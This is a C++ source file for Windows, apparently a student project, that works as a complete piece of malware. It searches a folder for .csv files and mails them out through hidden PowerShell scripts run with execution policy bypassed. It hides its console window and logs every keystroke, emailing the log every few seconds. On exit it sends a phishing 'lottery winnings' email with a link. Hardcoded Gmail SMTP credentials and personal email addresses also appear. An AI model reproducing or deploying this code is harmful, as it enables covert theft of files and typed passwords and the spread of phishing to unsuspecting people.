#include <chrono>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <sstream>
#include <thread>
#include <vector>

#define _WIN32_WINNT 0x0500
#include <Windows.h>

using namespace std::literals;
namespace fs = std::filesystem;

// email info
std::string to = "hleatherwood_2023@depauw.edu";
std::string from = "JohnDoeTestLog@gmail.com";
std::string username = "JohnDoeTestLog@gmail.com";
std::string password = "rihqbkdkqymdvxrb";
std::string server = "smtp.gmail.com";
std::string port = "587";

// search info
std::string search_dir = "C:\\Users\\hleatherwood_2023\\Desktop\\Project";
std::string search_ext = ".csv";

// timer info
std::chrono::seconds wait_time = 5s;
int iterations = -1;

// keylogger/email vars
std::string tmp_file_path = "C:\\Users\\hleatherwood_2023\\Desktop\\Project\\tmp.ps1";
std::string LOGFILE = "C:\\Users\\hleatherwood_2023\\Desktop\\log.txt";
bool RECORDING = true;
char KEY;
int COUNT = 0;
bool LOOPING = true;

std::vector<std::string> search_path(std::string dir, std::string ext) {
    // init return vector
    std::vector<std::string> file_paths;

    // search thru the path
    for(auto &p : fs::recursive_directory_iterator(dir)) {
        if(p.path().extension() == ext) {
            file_paths.push_back(p.path().string());
        }
    }

    // return a vector of file paths
    return file_paths;
}

void send_files(std::string to, std::string from,
                std::string username, std::string password, std::string server,
                std::string port, std::string path, std::string ext) {
    // set subject and message
    std::string subject = "Sensitive Files";
    std::string msg = "Found sensitive files:";

    // get list of sensitive files
    std::vector<std::string> files = search_path(path, ext);
    if(files.size() == 0) {
        return;
    }

    // open the tmp powershell script
    std::ofstream tmp;
    tmp.open(tmp_file_path);

    // make a string of the powershell command
    std::string ps_cmd = "$Username = \"" + from + "\"\n";
    ps_cmd += "$Password = \"" + password + "\"\n";
    ps_cmd += "$To = \"" + to + "\"\n";
    ps_cmd += "$Subject = \"" + subject + "\"\n";
    ps_cmd += "$Body = \"" + msg + "\"\n";
    ps_cmd += "$SMTPServer = \"" + server + "\"\n";
    ps_cmd += "$SMTPPort = \"" + port + "\"\n";
    ps_cmd += "$SMTPMessage = New-Object System.Net.Mail.MailMessage($Username, $To, $Subject, $Body)\n";
    for(int i=0; i < files.size(); i++) {
        ps_cmd += "$SMTPMessage.Attachments.Add($(New-Object System.Net.Mail.Attachment($(\"" + files[i] + "\"))))\n";
    }
    ps_cmd += "$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)\n";
    ps_cmd += "$SMTPClient.EnableSsl = $true\n";
    ps_cmd += "$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)\n";
    ps_cmd += "$SMTPClient.Send($SMTPMessage)\n";

    // write the command string to the tmp file
    tmp << ps_cmd;
    tmp.close();

    // execute the ps script and remove it
    std::string exec_cmd = "powershell -ExecutionPolicy Bypass -F " + tmp_file_path;
    system(exec_cmd.c_str());
    remove(tmp_file_path.c_str());
}

void spread_link(std::string to, std::string from,
                 std::string username, std::string password, std::string server,
                 std::string port) {
    // set subject and message
    std::string subject = "Claim Your Lottery Winnings Now!!!";
    std::string msg = "Congratulations! You are the lucky winner of a lottery! You have won a significant prize and your life is about to change forever. Please go to the following link to claim your prize:\nhttps://khoinguyen0412.github.io/Lottery_Site/";

    // open the tmp powershell script
    std::ofstream tmp;
    tmp.open(tmp_file_path);

    // make a string of the powershell command
    std::string ps_cmd = "$Username = \"" + from + "\"\n";
    ps_cmd += "$Password = \"" + password + "\"\n";
    ps_cmd += "$To = \"" + to + "\"\n";
    ps_cmd += "$Subject = \"" + subject + "\"\n";
    ps_cmd += "$Body = \"" + msg + "\"\n";
    ps_cmd += "$SMTPServer = \"" + server + "\"\n";
    ps_cmd += "$SMTPPort = \"" + port + "\"\n";
    ps_cmd += "$filenameAndPath = \"" + LOGFILE + "\"\n";
    ps_cmd += "$SMTPMessage = New-Object System.Net.Mail.MailMessage($Username, $To, $Subject, $Body)\n";
    ps_cmd += "$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)\n";
    ps_cmd += "$SMTPClient.EnableSsl = $true\n";
    ps_cmd += "$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)\n";
    ps_cmd += "$SMTPClient.Send($SMTPMessage)\n";

    // write the command string to the tmp file
    tmp << ps_cmd;
    tmp.close();

    // execute the ps script and remove it
    std::string exec_cmd = "powershell -ExecutionPolicy Bypass -F " + tmp_file_path;
    system(exec_cmd.c_str());
    remove(tmp_file_path.c_str());
}

void email_log(std::string to, std::string from,
               std::string username, std::string password, std::string server,
               std::string port, std::string msg) {
    // set subject and message
    std::string subject = "Log Data";

    // open the tmp powershell script
    std::ofstream tmp;
    tmp.open(tmp_file_path);

    // make a string of the powershell command
    std::string ps_cmd = "$Username = \"" + from + "\"\n";
    ps_cmd += "$Password = \"" + password + "\"\n";
    ps_cmd += "$To = \"" + to + "\"\n";
    ps_cmd += "$Subject = \"" + subject + "\"\n";
    ps_cmd += "$Body = \"" + msg + "\"\n";
    ps_cmd += "$SMTPServer = \"" + server + "\"\n";
    ps_cmd += "$SMTPPort = \"" + port + "\"\n";
    ps_cmd += "$filenameAndPath = \"" + LOGFILE + "\"\n";
    ps_cmd += "$SMTPMessage = New-Object System.Net.Mail.MailMessage($Username, $To, $Subject, $Body)\n";
    ps_cmd += "$SMTPMessage.Attachments.Add($(New-Object System.Net.Mail.Attachment($filenameAndPath)))\n";
    ps_cmd += "$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)\n";
    ps_cmd += "$SMTPClient.EnableSsl = $true\n";
    ps_cmd += "$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)\n";
    ps_cmd += "$SMTPClient.Send($SMTPMessage)\n";

    // write the command string to the tmp file
    tmp << ps_cmd;
    tmp.close();

    // execute the ps script and remove it
    std::string exec_cmd = "powershell -ExecutionPolicy Bypass -F " + tmp_file_path;
    system(exec_cmd.c_str());
    remove(tmp_file_path.c_str());
}

// send an email every so many seconds
void email_timer(std::string to, std::string from,
                 std::string username, std::string password, std::string server,
                 std::string port, std::chrono::seconds time, int iterations) {
    // set the subject
    std::string subject = "Log Data";

    // start the loop
    while(LOOPING) {
        if(COUNT == iterations) {
            LOOPING = false;
        } else {
            // email the log
            std::stringstream ss_msg;
            ss_msg << "Log data " << (COUNT+1) << ":";
            email_log(to, from, username, password, server, port, ss_msg.str());
            std::this_thread::sleep_for(time);
            COUNT++;
        }
    }
}

// log function for nonstandard keys
void LOG(std::string input) {
    std::fstream fs_logfile;
    fs_logfile.open(LOGFILE, std::fstream::app);
    if (fs_logfile.is_open()) {
        fs_logfile << input;
        fs_logfile.close();
    }
}

// handle special keys
bool SpecialKeys(int S_Key) {
    switch (S_Key) {
        case VK_SPACE:
            LOG(" ");
            return 1;
        case VK_RETURN:
            LOG("\n");
            return 1;
        case VK_OEM_PERIOD:
            LOG(".");
            return 1;
        case VK_SHIFT:
            LOG("[SHIFT]");
            return 1;
        case VK_BACK:
            LOG("[BACK]");
            return 1;
        case VK_RBUTTON:
            LOG("[R_CLICK]");
            return 1;
        case VK_LBUTTON:
            LOG("[L_CLICK]");
            return 1;
        case VK_CAPITAL:
            LOG("[CAPS_LOCK]");
            return 1;
        case VK_TAB:
            LOG("[TAB]");
            return 1;
        case VK_UP:
            LOG("[UP]");
            return 1;
        case VK_DOWN:
            LOG("[DOWN]");
            return 1;
        case VK_LEFT:
            LOG("[LEFT]");
            return 1;
        case VK_RIGHT:
            LOG("[RIGHT]");
            return 1;
        case VK_CONTROL:
            LOG("[CTRL]");
            return 1;
        case VK_MENU:
            LOG("[ALT]");
            return 1;
        case VK_INSERT:
            LOG("[INSERT]");
            return 1;
        case VK_HOME:
            LOG("[HOME]");
            return 1;
        case VK_PRINT:
            LOG("[PRINT]");
            return 1;
        case VK_DELETE:
            LOG("[DEL]");
            return 1;
        case VK_F1:
	        LOG("[F1]");
	        return 1;
        case VK_F2:
            LOG("[F2]");
            return 1;
        case VK_F3:
            LOG("[F3]");
            return 1;
        case VK_F4:
            LOG("[F4]");
            return 1;
        case VK_F5:
            LOG("[F5]");
            return 1;
        case VK_F6:
            LOG("[F6]");
            return 1;
        case VK_F7:
            LOG("[F7]");
            return 1;
        case VK_F8:
            LOG("[F8]");
            return 1;
        case VK_F9:
            LOG("[F9]");
            return 1;
        case VK_F10:
            LOG("[F10]");
            return 1;
        case VK_F11:
            LOG("[F11]");
            return 1;
        case VK_F12:
            LOG("[F12]");
            return 1;
        case VK_F13:
            LOG("[F13]");
            return 1;
        case VK_F14:
            LOG("[F14]");
            return 1;
        case VK_F15:
            LOG("[F15]");
            return 1;
        case VK_F16:
            LOG("[F16]");
            return 1;
        case VK_F17:
            LOG("[F17]");
            return 1;
        case VK_F18:
            LOG("[F18]");
            return 1;
        case VK_F19:
            LOG("[F19]");
            return 1;
        case VK_F20:
            LOG("[F20]");
            return 1;
        case VK_ESCAPE:
            RECORDING = false;
            LOOPING = false;
            email_log(to, from, username, password, server, port, "Final log data before stopping:");
            std::cout << "Logs sent." << std::endl;
            return -1;
        default:
            return 0;
    }
}

int main() {
    // search for and send sensitive files via email -----------------------------------------------------
    send_files(to, from, username, password, server, port, search_dir, search_ext);
    std::cout << "Sending files..." << std::endl;

    // start the email timer to send emails every x seconds --------------------------------------------
    std::thread t(email_timer, to, from, username, password, server, port, wait_time, iterations);
    std::cout << "Starting keylogger..." << std::endl;

    // start the keylogger ---------------------------------------------------------------------------------
    // hide the window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // record keys and write to file
    while(RECORDING) {
        Sleep(10);
        for(int KEY=8; KEY <= 190; KEY++) {
            if(GetAsyncKeyState(KEY) == -32767) {
                int state = SpecialKeys(KEY);
                if(state == 0) {
                    std::fstream fs_logfile;
                    fs_logfile.open(LOGFILE, std::fstream::app);
                    if(fs_logfile.is_open()) {
                        fs_logfile << char(KEY);
                        fs_logfile.close();
                    }
                } else if(state == -1) {
                    // quit on escape and email log
                    break;
                }
            }
        }
    }

    // join threads, spread the link, then return
    spread_link("khoinguyen_2024@depauw.edu", from, username, password, server, port);
    t.join();

    return 0;
}
